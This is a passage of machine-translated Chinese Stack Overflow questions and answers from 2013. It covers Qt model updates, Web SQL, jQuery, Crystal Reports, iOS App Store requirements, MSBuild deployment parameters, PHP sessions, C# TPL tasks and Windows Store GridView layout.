如果我理解正确，您需要通知订阅视图有关指定模型索引的数据更改（一行被新替换，对于视图，这意味着数据已更改）：

```
// let's the row is index that we want to invalidate
QVector<int> roles;
roles << Qt::DisplayRole;
emit dataChanged(index(row, 0), index(row, columnCount()-1), roles); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T11:24:19.587

如果要更改大量数据，则应执行以下操作：

```
beginResetModel();
// change data
endResetModel(); 
```

如果您只更改一行，则发出 dataChanged() 应该可以解决问题。

# html - 如何永久保护 Web SQL 中的数据，让任何人都无法删除我的数据？

> ID：15562800
> 
> 赞同：0
> 
> 时间：2013-03-22T04:35:08.053
> 
> 标签：html, web-sql

我将一些数据存储在客户端（浏览器的 Web SQL）。当然数据是永久存储的，但是如果入侵者写了一个程序来清除本地存储（`localstorage.clear()`）这个函数会删除我在Web SQL中的全部数据。

那么如何永久保护 Web SQL 中的数据呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:48:42.647

取自[HTML5 Doctor](http://html5doctor.com/introducing-web-sql-databases/)：

> 请注意，从 11 月 18 日起，W3C 不再积极致力于 Web SQL 数据库规范。

取自[W3C 的规范页面](http://www.w3.org/TR/webdatabase/)：

![一个](../Images/fb9f20c650495a74c3e19bd9382047d7.png)

在此基础上，如果存在允许擦除本地存储的安全漏洞，我不会感到惊讶。不推荐使用 Web SQL - 不要使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T07:38:37.707

您无法在客户端保护您的数据。但是，WebSQL 不会受到 localStorage 的影响，这是一种完全不同的存储机制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-23T03:02:32.790

`localstorage.clear()`与 WebSQL 或 IndexedDB 无关。这是三个不同的 API。所有这些都是临时存储。他们随时可能被消灭。

没有所谓的“入侵者”。您页面上运行的所有代码都是您编写或信任的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-12T01:56:34.550

您无法在客户端保护数据。无论您使用什么 API，您都需要始终假设客户端的数据可能会受到损害或丢失。

# jquery - 使用 jquery ui 模式加载外部 url

> ID：15562801
> 
> 赞同：0
> 
> 时间：2013-03-22T04:35:08.457
> 
> 标签：jquery

这个问题以前有人问过，但没有得到回答。

我有评论的链接作为阅读评论，我已经阅读评论，我已经阅读评论......

如何将外部 URL 加载到我的模式对话框中？

仅供参考，我想将其用于网站上每个帖子的评论。所以我想要加载多个 URL（不是同时）onClick。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:40:43.983

您可以通过 jquery 加载外部 url [`Load()`](http://api.jquery.com/load/)。此方法是从服务器获取数据的最简单方法。它大致相当于 $.get(url, data, success) ，只是它是一个方法而不是全局函数，并且它具有隐式回调函数。当检测到成功响应时（即当 textStatus 为“success”或“notmodified”时），.load() 将匹配元素的 HTML 内容设置为返回的数据。这意味着该方法的大多数用途都非常简单：

```
$('#result').load('ajax/test.html', function(data) {
  // dosome thing with your call back function
}); 
```

对话框

```
$('#dialog').dialog({
open:function(){
    //append the html from load();
}
}); 
```

# crystal-reports - 如何总结每行的字段并获得其结果，然后将其添加到 Crystal Report 中组的下一行

> ID：15562802
> 
> 赞同：1
> 
> 时间：2013-03-22T04:35:10.837
> 
> 标签：crystal-reports

```
A组
项目期初余额价格 +12% 期末余额
项目一 0.00 100.00 12.00 112.00
项目二 112.00 100.00 12.00 224.00
项目三 224.00 100.00 12.00 336.00

B组
项目期初余额价格 +12% 期末余额
项目四 0.00 100.00 12.00 112.00
项目五 112.00 100.00 12.00 224.00
项目六 224.00 100.00 12.00 336.00

```

我如何使用 Crystal Report 完成这些，在这些[表](http://i60.photobucket.com/albums/h12/athina_15/cr_zps99352e9a.jpg)中，我的数据库中唯一的字段是 Group、Item 和 Price；其余的是水晶报告。

请帮忙..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-31T05:39:34.697

如果我了解您在这里尝试做什么，我会执行以下操作：

为每行创建一个公式以将 12% 添加到价格中，例如
{priceUplift}=

```
{price}*1.12 
```

如果百分比发生变化，您可以使用变量字段，例如 {Percent} 而不是 1.12

* * *

然后使用“3-公式技巧”（如果您不知道，请在 Google 上获取更多信息）

公式1：{平衡重置}

```
WhilePrintingRecords;
numbervar balance:=0; 
```

公式 2：{平衡更新}

```
WhilePrintingRecords;
numbervar balance;
balace:=balace+{priceUplifted} 
```

Forumla3：{平衡显示}

```
WhilePrintingRecords;
numbervar balance;
balace; 
```

* * *

按如下方式插入字段：

```
Header       |ITEM            Opening-Balance   Price   %12          Closing-Balance 
Group 1 head |Group By{Group} {Balance-Reset}
Details      |{item}          {Balance-Display} {price} {Percentage} {Balance-Update} 
```

* * *

我还没有测试过这就是我开始问题的方式（我认为它应该可以工作）。如果出现问题，则与显示期初余额之前的期末余额更新有关

干杯乙

# iphone - 从 5 月 1 日起 - iPhone 5 支持 - 那么应用商店支持的最低 iOS 版本是多少？

> ID：15562803
> 
> 赞同：0
> 
> 时间：2013-03-22T04:35:17.057
> 
> 标签：iphone, ios, ios6, autolayout, iphone-5

苹果在其开发者新闻中发布——“从 5 月 1 日开始，提交到 App Store 的新应用程序和应用程序更新必须适用于配备 Retina 显示屏的 iOS 设备，并且 iPhone 应用程序还必须支持 iPhone 5 上的 4 英寸显示屏。”

当然我们必须使用 iOS 6 来使用 autoLayout 来支持 iPhone 5 和以前的设备.. 但是还有其他方法吗？

如果是这样，那么从 5 月 1 日开始，应用商店将支持的最低 iOS 版本是多少？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:41:52.820

您不需要使用自动布局来支持 iPhone 5。

5 月 1 日，您仍然可以支持 iOS 4.3 或更高版本。您仍然可以支持任何运行 iOS 4.3 或更高版本的设备。

要求是您的应用程序必须具有完整的视网膜支持（@2x 图像），并且您必须支持 iPhone 5 和第 5 代 iPod touch 的 4 英寸屏幕（不再有信箱）。

所以基本上几乎没有什么变化。苹果只是要求人们支持更新的设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-30T10:01:45.300

最低操作系统版本为 4.3，并且必须支持 iPhone 5。您还应该提供视网膜（@2x）图像。

自动布局是 ios 6 中可用的功能，您只能在部署目标 6.0 中使用它。

因此，在所有 xib 的文件检查器中禁用自动布局，您将能够支持 ios4.3

# android - Android 如何检查 URL 名称或 IP 是否可访问

> ID：15562805
> 
> 赞同：0
> 
> 时间：2013-03-22T04:35:26.360
> 
> 标签：android, url, inetaddress

我的代码如下：

```
public chkRechable(String hostNameOrIp) {

boolean isRechable = InetAddress.getByName(hostNameOrIp).isReachable(30);
return isRechable;
} 
```

参数可以是`"http://192.168.0.77:8080/ws/api/customer/5"`或`"http://example.com:8080/ws/api/customer/5"`

但每次它返回 false 虽然我可以浏览 URL。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:47:44.490

你是什​​么意思“可达”？如果“打开页面”意味着“可达”，您可以尝试使用 HTTP 连接来连接它。如果您遇到异常：您的网络可能会下降；您无法连接到主机；然后你应该检查http返回码，看看是否有404或其他错误。

# html - 如何制作页脚的图像映射

> ID：15562808
> 
> 赞同：0
> 
> 时间：2013-03-22T04:35:42.013
> 
> 标签：html, css

我正在尝试将导航栏固定在页面的右下角，我已经完成了，我正要从中制作图像地图，直到我进入dreamweaver并且我的图像甚至没有弹出到到处画，我打算手动做，直到我想知道，这还能用吗？（因为它实际上一直在移动，所以很难在上面制作坐标。）我将如何将我的图像变成可操作的可点击按钮？

![这是我的页脚的样子](../Images/7c2771673bba800f234985e4bc2aff6a.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:46:57.513

如果你发现很难映射图像，请改为使用`position: relative;`容器，稍后使用`<a>`并使用以下样式

```
a {
   display: block;
   height: 30px; /* Set accordingly */
   width: 30px; /* Set accordingly */
   position: absolute;
   /* Now set top, bottom, left, right according to your requirements */
} 
```

只是一个旁注，`border: 1px solid #f00;`只是为了确保你`<a>`包裹了确定的目标，稍后你可以删除或禁用边框。

你也可以使用`:nth-of-type`for`<a>`所以你不需要为每个`<a>`元素声明类

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:43:17.237

如果您无法让 Dreamweaver 合作，您可以随时尝试这样的 Web 应用程序：

[http://www.image-maps.com/](http://www.image-maps.com/)

我自己没有使用它，但看起来你上传了一张图片，该网站帮助你绘制你的区域，完成后你下载代码。

# jquery - 在滚动时背景颜色更改期间包括颜色

> ID：15562815
> 
> 赞同：1
> 
> 时间：2013-03-22T04:36:07.500
> 
> 标签：jquery, css, colors, background

我有这段代码可以更改滚动时的背景颜色，但它只会从“开始颜色”变为“结束颜色”，是否可以在它们之间包含其他颜色？

[**例子**](http://jsfiddle.net/V4qh9/11/)

```
 $(document).ready(function(){  

    var scroll_pos = 0;
    var animation_begin_pos = 0;
    var animation_end_pos = $(document).height();
    var beginning_color = new $.Color( 'rgb(140,212,208)' ); 
    var ending_color = new $.Color( 'rgb(145,216,247)' ); ;//what color we want to use in the end
    $(document).scroll(function() {
        scroll_pos = $(this).scrollTop(); 
        if(scroll_pos >= animation_begin_pos && scroll_pos <= animation_end_pos ) { 
           // console.log( 'scrolling and animating' );
            //we want to calculate the relevant transitional rgb value
            var percentScrolled = scroll_pos / ( animation_end_pos - animation_begin_pos );
            var newRed = beginning_color.red() + ( ( ending_color.red() - beginning_color.red() ) * percentScrolled );
            var newGreen = beginning_color.green() + ( ( ending_color.green() - beginning_color.green() ) * percentScrolled );
            var newBlue = beginning_color.blue() + ( ( ending_color.blue() - beginning_color.blue() ) * percentScrolled );
            var newColor = new $.Color( newRed, newGreen, newBlue );
            //console.log( newColor.red(), newColor.green(), newColor.blue() );
            $('body').animate({ backgroundColor: newColor }, 0);
        } else if ( scroll_pos > animation_end_pos ) {
             $('body').animate({ backgroundColor: ending_color }, 0);
        } else if ( scroll_pos < animation_begin_pos ) {
             $('body').animate({ backgroundColor: beginning_color }, 0);
        } else { }
    });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:53:05.067

**更新**：有五种背景颜色。

只需执行以下操作：

```
 $(document).ready(function(){ 
        var colorCodes = ['red','blue','green','yellow','orange'];
        $(window).on('scroll',function(){
            var value = $('body').scrollTop()%5;
            $('body').animate({
                 backgroundColor: colorCodes[value]
            }, 100 );
        });
    }); 
```

根据 scrollTop() 的值更改颜色代码。

获取一组您自己的颜色代码并根据 scrollTop() 值调用它们。

[**工作小提琴**](http://jsfiddle.net/V4qh9/14/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:41:20.163

使用以下脚本创建随机颜色代码..

```
var colorcode= 'rgb('
            + (Math.floor(Math.random() * 256)) + ','
            + (Math.floor(Math.random() * 256)) + ','
            + (Math.floor(Math.random() * 256)) + ')'; 
```

# msbuild - 如何通过命令行将 MSDeploy 样式的参数传递给 MSBuild？

> ID：15562817
> 
> 赞同：3
> 
> 时间：2013-03-22T04:36:23.707
> 
> 标签：msbuild, teamcity, msdeploy, webdeploy

我正在设置 TeamCity 以将我们的网站项目应用程序（使用 *.wdproj）和 Web 部署应用程序部署到 IIS。

我有一个构建配置，它使用 MSBuild.exe 和 MSDeployPublish 来构建然后部署应用程序。

我们现在想让应用程序部署到多个目标环境，因此需要一种方法来根据目标环境提供不同的设置。

我已向 Web 部署项目添加了一个 parameters.xml 文件，并验证了此处设置的参数一直通过目标 IIS 服务器并被正确应用 - 太棒了！

现在我想做的是每个环境有不同的参数设置。我希望我可以使用类似 MSDeploy.exe -setParam 参数来为每个环境指定不同的值，但是我找不到通过命令行将参数值导入 MSBuild 的方法。

我怀疑我可能需要执行以下操作之一：

1.  将 MSBuild 和 MSDeploy 拆分为单独的构建步骤。

2.  在管道中的某处配置一个任务，以获取 parameters.something.xml 的 n 个版本中的 1 个并将其移动到 parameters.xml 中，以便它被管道的其余部分拾取。

我正在寻找最简单的方法来推进这一点，欢迎提出任何建议。

作为参考，这是我现在正在试验的命令：

```
msbuild /target:MSDeployPublish MySite_deploy.wdproj /P:Configuration=Debug
/P:DeployOnBuild=True /P:DeployTarget=MSDeployPublish
/P:MsDeployServiceUrl=www.myserver.com:8172/MsDeploy.axd
/P:AllowUntrustedCertificate=True /P:MSDeployPublishMethod=WMSvc
/P:CreatePackageOnPublish=True /P:UserName=MyUser /p:Password=MyPassword
/P:DeployIisAppPath=www.myserver.com/MySite
/P:ServerURL=http://www.tryingtoforcethis.com 
```

除了 ServerURL 的值（我在 parameters.xml 中定义的一个参数）没有进入目标站点之外，它运行良好。然而，我在 parameters.xml 中指定的默认值是。所以我知道参数正在工作，我只是不知道如何将它们添加到 msbuild 命令行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-23T21:55:39.960

好吧，我认为简短的回答是，使用 MSBuild 4.0 和 VS2010，您不能将任意参数从调用 MSBuild 传递到 MSDeployPublish。

我发现这些帖子很有帮助：

[http://forums.iis.net/t/1167657.aspx/1](http://forums.iis.net/t/1167657.aspx/1) - 陈明的评论

[http://www.hanselman.com/blog/TinyHappyFeatures3PublishingImprovementsChainedConfigTransformsAndDeployingASPNETAppsFromTheCommandLine.aspx](http://www.hanselman.com/blog/TinyHappyFeatures3PublishingImprovementsChainedConfigTransformsAndDeployingASPNETAppsFromTheCommandLine.aspx) - Richard Szalay 在底部的评论

在阅读了这些内容并筛选了 Microsoft.Web.Publishing.targets 文件一段时间试图找到“进入”之后，我最终决定在源代码管理的项目文件夹中拥有多个 Parameters.xml 副本，根据标记他们的环境，例如：

*   参数.Test.xml
*   参数.Staging.xml
*   参数.Live.xml

然后，在打包和部署之前，我只需将其中一个文件复制到 Parameters.xml 中，它就会被管道的其余部分拾取 - 完成！

顺便说一句，由于似乎是某种文件访问问题，我在单个 MSBuild.exe 调用中获取 parameters.xml 副本和随后的清理工作时遇到了一个临时问题，我在这里详细说明了：

[MSBuild.exe 复制任务无法正常工作，除非该文件的某个版本已出现在目标中](https://stackoverflow.com/questions/15587678/msbuild-exe-copy-task-not-working-properly-unless-a-version-of-the-file-already)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-05-01T15:15:16.523

要回答您的问题，命令行的参数化不是 MSBuild 的关注点。相反，您应该使用外部工具。例如，如果您从批处理文件运行 msbuild 命令，您可以将参数传递给批处理文件并使用不同参数为每个环境运行它。另一种方法是使用像 TeamCity 或 VSTS 这样的构建系统并利用它们的参数化机制。适用于 VSTS 或 TFS，您的命令可能如下所示：

```
msbuild MySite_deploy.wdproj /target:MSDeployPublish /p:Configuration=Debug
/p:DeployOnBuild=True /p:MsDeployServiceUrl=$(IIsHostNameIp)
/p:AllowUntrustedCertificate=True /p:MSDeployPublishMethod=WMSvc
/p:CreatePackageOnPublish=True /p:UserName=$(IIsUserName) /p:Password=$(IIsPassword)
/p:DeployIisAppPath=$(IIsSite) 
```

此外，我建议对您的原始命令行进行一些清理：

1.  同时使用 /p:target 和 /p:DeployTarget 是多余的。其中任何一个都足够了。它也可以替换为 /p:WebPublishMethod。
2.  对于 /p:MSDeployServiceUrl，只需提供 DNS 名称或 IP 就足够了。端口和 URL 自动从 /p:MSDeployPublishingMethod=WMSVC 派生。
3.  自定义参数 /p:ServerURL 是未知的，不会映射到任何地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:01:14.977

```
msbuild.exe {build-script.proj}  /property:{someParameter=someValue} 
```

In your build script you can use $(someParameter) as a variable

# caching - 如上所述快速写入/读取/缓存简单信息的最快方法

> ID：15562821
> 
> 赞同：0
> 
> 时间：2013-03-22T04:36:32.873
> 
> 标签：caching, python-2.7

我为这个可怕的问题道歉。我是一个 3D 人，业余爱好者使用 python 插件和脚本。

我已经成功地提出了导出粒子信息的最坏方法（每帧每个粒子两个向量用于位置和对齐）。我的第一种方法是将每行十亿个向量写入 .txt，其中每行代表一个帧。现在我只需要每帧写出一个 .txt 文件，然后根据帧加载和关闭正确的文件。

是的，它很慢。和愚蠢。任何。你建议我去/研究什么方向？不同的文件类型？A :checks google: bin，也许？还是我的迟钝方法实际上不需要很长时间，而其他东西使事情进展得更慢？我不需要详尽的答案，只需要一些一般信息即可让我朝着正确的方向前进。

太感谢了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T16:01:56.580

如果这个信息将被另一个 python 应用程序读取（特别是如果它是写出它的同一个应用程序），请考虑只[腌制](http://docs.python.org/2/library/pickle.html)你的数据结构。只需在内存中构建它们并使用 pickle 将它们转储到二进制文件中。这里的警告：

1）您是否有记忆一次完成所有操作，还是必须一次完成一帧？您可以在第一种情况下制作大的组合文件，在第二种情况下您需要每文件一帧。如果您的内存不足，那么[yield](https://stackoverflow.com/questions/102535/what-can-you-use-python-generator-functions-for)语句就是您的朋友。2）腌制文件需要是相同的python版本才能可靠，所以你需要确保所有的读写应用程序都在同一个python版本上。 3）腌制文件是二进制的，所以不是人类可读的。

如果您需要与其他应用程序进行交换，请查看[Alembic](https://code.google.com/p/alembic/)，这是一种专为此类问题设计的开源文件格式 - 烘焙大量粒子或模拟数据。有一个[来自 EcoCortex 的商业出口商](http://exocortex.com/products/crate)，它带有一个用于处理 Alembic 数据的 Python 模块

# javascript - localStorage 和 Null 值

> ID：15562823
> 
> 赞同：1
> 
> 时间：2013-03-22T04:36:47.490
> 
> 标签：javascript, html, null, local-storage

我有这个 if 语句：

```
if(localStorage.getItem('user') != null){
        alert('get values called from start. User stored: '+localStorage.getItem('user'));
        getValues();
    } 
```

假设只有在有用户登录时才运行 getValues。但是，即使存储的用户为空，它也会运行。如下图所示，user 值为 null 那么它为什么会运行呢？

这是我的网站：[http ://www3.carleton.ca/clubs/sissa/html5/](http://www3.carleton.ca/clubs/sissa/html5/)

![在此处输入图像描述](../Images/98a2c028d8a801155e6208376818f2da.png)

# windows-phone-7 - 我可以在 windows mobile 中播放 m3u8 格式吗？

> ID：15562826
> 
> 赞同：0
> 
> 时间：2013-03-22T04:37:07.577
> 
> 标签：windows-phone-7, radio, live-streaming, m3u8

抱歉这个问题，我没有 windows mobile 来测试。我正在尝试开发一个实时互联网广播应用程序。

他们流式传输的格式是 m3u8，我有适用于所有其他移动平台的 SDK，但没有适用于 windows phone。

是否有任何可用于播放互联网广播的 SDK 或默认支持 m3u8 格式的媒体。

请给我建议。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T16:52:41.530

默认情况下 - 没有。但是，您可以使用[HTTP Live Streaming SDK](http://www.3ivx.com/technology/windows/metro/http_live_streaming.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-14T09:41:42.303

您可以尝试同时支持 Windows Phone 8 和 Windows Phone 7 的 Windows Phone 流媒体，这里有一篇关于它的[博客文章](http://www.tareqateik.com/http-live-streaming-hls-on-windows-phone-not-3ivx-free-solution#.UZIFjbX-HK0)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-20T08:36:18.153

还有播放器框架 [Player Framework](http://playerframework.codeplex.com/ "播放器框架")

# dart - 使用飞镖编辑器双击时如何自动打开文件？

> ID：15562831
> 
> 赞同：1
> 
> 时间：2013-03-22T04:37:49.353
> 
> 标签：dart, winscp, dart-editor

我正在使用 winscp 上传文件，当我双击服务器上的 .dart 文件时，darteditor 会打开，但实际上并没有打开文件。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T08:24:52.520

这是 Dart 编辑器上报告的问题。你可以在这里找到它 - [https://code.google.com/p/dart/issues/detail?id=344](https://code.google.com/p/dart/issues/detail?id=344)

注意：请给问题加注星标，以便引起注意。

# actionscript-3 - 从 flexGlobals.topLevelApplication 获取内部组件

> ID：15562834
> 
> 赞同：0
> 
> 时间：2013-03-22T04:38:01.683
> 
> 标签：actionscript-3, apache-flex, flex4

我觉得访问内部组件的方式比我所知道的要好。我知道我们可以访问任何内部组件，例如：FlexGlobals.topLevelApplication.someChild1.someChild2.someChild3…等等

我有一个具有多个父组件层次结构的组件。我想知道是否无论如何我都可以访问最后一个孩子而不参考其所有父母。

我需要在该组件上触发一个事件。

```
FlexGlobals.topLevelApplication.child1.child2.child3.dispatchEvent(new Event('clearData', true)); 
```

更新：我尝试了您在第 1 点中建议的方式。我在子组件上添加了事件侦听器，并尝试从动作脚本文件中调度它，但它没有被听到。\

```
child3.addEventLisener('clearData', clearHandler); 
```

然后我发送了一些类似的事件：

```
dispatchEvent(new Event(modelApp.CLEAR_PALETTE, true) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T07:56:51.290

尝试添加

```
FlexGlobals.topLevelApplication.systemManger.addEventLisener('clearData', clearHandler); 
```

在孩子3

并将它从任何你想去的地方驱散，

调度使用以下

```
FlexGlobals.topLevelApplication.systemManager.dispatchEvent(new Event(modelApp.CLEAR_PALETTE, true) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:49:17.177

我认为您应该深入到组件级别并在初始化时添加事件监听器。并从您想要的任何地方发送。

另一种方法是这样做，您需要在创建完成时将组件引用（ID）保存在对象中。将其参考保存在您的模型中。现在您可以随时随地访问它。做任何你想做的事。

我也是这样做的，我将我的屏幕组件引用保存在一个数组中，并在我需要动态验证所有组件的地方访问它。

否则你需要嵌套循环来获得你需要的孩子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T08:00:48.343

我如何从这个问题中理解没有使用应用程序设计的良好原则，但这是另一个问题。
在您的情况下，您可以将阶段用作气泡事件的全局 currentTarget。来自 displayObject 的调度事件，气泡 = true；在目标显示对象中侦听事件，带有/不捕获阶段的阶段对象。

在任何显示对象中：

```
dispatchEvent(new Event("myEvent", true)); 
```

在目标显示对象中：

```
// add ADDED_TO_STAGE event listener in constructor or when component creation complete
protected function component_creationCompleteHandler(event:FlexEvent):void
{
    addEventListener(Event.ADDED_TO_STAGE, onAddToStage);
}

..

protected function onAddToStage(event:Event):void
{
    stage.addEventListener("myEvent", eventHandler, true);
}

protected function eventHandler(event:Event):void
{
    trace("eventHandler");
} 
```

它比使用对 FlexGlobals 对象的引用要好。代码更灵活。

# php - 在服务器上但在本地主机上没有 PHP 会话问题

> ID：15562835
> 
> 赞同：2
> 
> 时间：2013-03-22T04:38:04.533
> 
> 标签：php, session, localhost

我通过会话传递用户变量。它在 localhost 上运行良好，但一旦在 Web 服务器上它会做一些奇怪的事情。

登录后，会话变量正常工作......直到您单击大约三个页面，它突然变得POOF！

注意“ `Welcome, jordan.`”而不是“ `Welcome, .`”也是左上角。

会话功能：http: [//imageshack.us/photo/my-images/32/loggedins.png/](http://imageshack.us/photo/my-images/32/loggedins.png/)

会议 POOF！ [http://imageshack.us/photo/my-images/515/loggedinno.png/](http://imageshack.us/photo/my-images/515/loggedinno.png/)

登录/创建会话变量代码：

```
<?php
        if (!isset($_SESSION['user']))
        {
        if (isset($_POST['user']))
        {
        $user = sanitizeString($_POST['user']);
        $pass = sanitizeString($_POST['pass']);
        if (preg_match($txtMatch,$user))
        {
        if ($user == "" || $pass == "")
        {
        $error = "Please enter all required fields";
        }
        else
        {
        $query = "SELECT * FROM gtmembers WHERE user='$user'";
        $result = queryMysql($query);
        $rank = mysql_result($result, 0, 'rank');
        if (!mysql_num_rows($result))
        {
        $error = "Username does not exist.";
        }
        else
        {
        $getPass = mysql_result($result, 0, 'pass');
        $salt = substr($getPass, 0, 64);
        $hash = $salt . $pass;
        for ($i = 0; $i < 100000; $i++) 
        {
        $hash = hash('sha256', $hash);
        }
        $hash = $salt . $hash;
        if ($hash == $getPass)
        {
        if ($rank != "Banned")
        {
        $userLow = strtolower($user);
        $_SESSION['user'] = $userLow;
        $_SESSION['rank'] = $rank;
        echo <<<_END
        <script type="text/javascript">
        window.location.href='index.php';
        </script>
        _END;
        echo "Successfully logged in. Click <a href='index.php'>here</a> to continue.";
        } 
```

标头代码：

```
 <?php //gtheader.php
        session_start();
        include_once 'gtfunctions.php';
        $loggedIn = FALSE;

        if (isset($_SESSION['user']))
        {
        $user = $_SESSION['user'];
        if ($user) echo "Current User: $user<br />";
        else echo "Current User: None<br />";
        $rank = $_SESSION['rank'];
        $loggedIn = TRUE;
        echo "is set SESSION['user']? Yes";
        }
        else echo "is set SESSION['user']? No";

        echo "<div id='header'><a class='header' href='index.php'> <h1 id='headerTitle'>$appname</h1></a>";
        if ($loggedIn == TRUE)
        {
        $query = "SELECT * FROM gtmessages WHERE recip='$user' AND status='0'";
        $result = queryMysql($query);
        if (mysql_num_rows($result) == 0) $num = "";
        else $num = "[".mysql_num_rows($result)."]";
        if ($rank == 'Owner' || $rank == 'Admin')
        {
        echo "Welcome, <a class='header' href='gtmembers.php?view=$user'>$user</a><a     class='header' href='gtmessage.php'>$num</a>. [<a class='header'     href='gtlogout.php'>Logout</a>] | <a class='header' href='gtadmin.php'>Admin</a><br />";
        }
        else
        {
        echo "Welcome, <a class='header' href='gtmembers.php?view=$user'>$user</a><a     class='header' href='gtmessage.php'>$num</a>. [<a class='header'     href='gtlogout.php'>Logout</a>]<br />";
        }
        }
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:43:41.723

如果它在一个环境而不是另一个环境中工作，我猜你的 PHP.ini`session.auto_start = 1`在工作的环境中。最佳做法是始终`session_start()`在页面顶部调用，而不是依赖于`php.ini`正确设置。这应该使它可以在任何环境中工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T01:56:37.910

解决了。

这里的问题是 Host Gator 注册了全局变量。因此，由于我使用 $user，并且 $_SESSION['user'] 被注册，它被覆盖。

我通过将所有文件中的 $_SESSION['user'] 更改为 $_SESSION['myUser'] 解决了这个问题

谢谢您的帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:56:15.647

必须`session_start()`在页面顶部调用

**gtheader.php**

```
<?php
    session_start();
    include_once 'gtfunctions.php';
    $loggedIn = FALSE;
    ..... 
```

# c# - 在 TPL 中返回一个空的静态任务是一种不好的做法吗？

> ID：15562845
> 
> 赞同：15
> 
> 时间：2013-03-22T04:38:27.613
> 
> 标签：c#, static, task-parallel-library, task

在某些情况下，我想有条件地运行任务。我使用某种扩展方法，如下所示：

```
public static class MyTaskExtension{
  private static Task theEmptyTask = Task.Factory.StartNew(() => {}); //This is the question

  public static Task ContinueWith(this Task task, Task continuationTask, Func<bool> condition)
  {
    if condition(){
       ... do the work
    }
    return theEmptyTask;
  }
} 
```

我的期望是 theEmptyTask 已经完成，所以基本上如果我不想做任何事情，我只是返回这个任务，而不是 null 或一个新的空任务。

我觉得这种方法应该有一些小故障。任何人都可以看到吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-22T13:44:33.513

在某些情况下返回已经完成的任务是完全可以接受的。这不是特别经常做的事情，但它已经完成了。

仅使用单个静态已完成任务也没有任何问题。没有必要拥有一大堆完全相同的不同任务，因为一旦它们完成，并且如果它们没有结果，那么重复使用它们并没有错。

请注意，如果您想返回一个已经完成的任务，您可以使用它`Task.FromResult`来生成一个开销低于您现在正在执行的任务，因为您不会创建一个空方法、调度它、等待它启动，并且然后让它立即完成。只是返回`Task.FromResult(false)`会给你一个已经完成的任务。

如果您使用的是 .NET 4.0，您可以轻松地创建自己的 FromResult：

```
public static Task FromResult<T>(T result)
{
    var tcs = new TaskCompletionSource<T>();
    tcs.SetResult(result);
    return tcs.Task;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T13:20:21.083

只要您交还处于已完成状态的任务（用于`TaskCompletionSource`执行此操作），我就不会想到任何问题，因为`Task`该类上实际上没有任何设置器可以让客户搞砸你的静态空任务。他们可以调用`Dispose()`您的任务，但我认为这不会造成任何伤害（即我认为这不会影响检查任务属性的能力（尚未尝试过——值得测试的东西） ））。

# gridview - windows商店应用程序gridview自定义？

> ID：15562848
> 
> 赞同：2
> 
> 时间：2013-03-22T04:38:39.647
> 
> 标签：gridview, windows-store-apps

我有一个 Windows Store App GridView，它通过 ItemsSource 属性绑定到一个集合。该集合有 5 个项目。默认情况下，项目是这样垂直显示的

项目1 项目3项目5
项目2 项目4

有没有办法像这样水平显示项目并指定要连续显示多少项目？

项目1
项目2 项目3 项目4 项目5

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T11:09:40.293

在 WinRT 中，没有特定的 Row 或 Column 计数可以在`GridView`'s `ItemsPanelTemplate`here中指定`VariableSizedWrapGrid`，但's`MaximumRowsOrColumns`取决于`Orientation`.`VariableSizedWrapGrid`

下面的代码演示了这两个输出。

XAML 代码

```
<Grid Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition />
    </Grid.RowDefinitions>
    <GridView x:Name="MyGv" Height="200" Width="650">
        <GridView.ItemTemplate>
            <DataTemplate>
                <Border Height="50" Width="200" Background="Gray">
                    <TextBlock FontSize="26.667" Text="{Binding}" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                </Border>
            </DataTemplate>
        </GridView.ItemTemplate>
        <GridView.ItemsPanel>
            <ItemsPanelTemplate>
                <VariableSizedWrapGrid Orientation="Horizontal" MaximumRowsOrColumns="3"/>
            </ItemsPanelTemplate>
        </GridView.ItemsPanel>
    </GridView>
    <GridView x:Name="MyGv1" Height="200" Width="650" Grid.Row="1">
        <GridView.ItemTemplate>
            <DataTemplate>
                <Border Height="50" Width="200" Background="Gray">
                    <TextBlock FontSize="26.667" Text="{Binding}" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                </Border>
            </DataTemplate>
        </GridView.ItemTemplate>
        <GridView.ItemsPanel>
            <ItemsPanelTemplate>
                <VariableSizedWrapGrid Orientation="Vertical" MaximumRowsOrColumns="2"/>
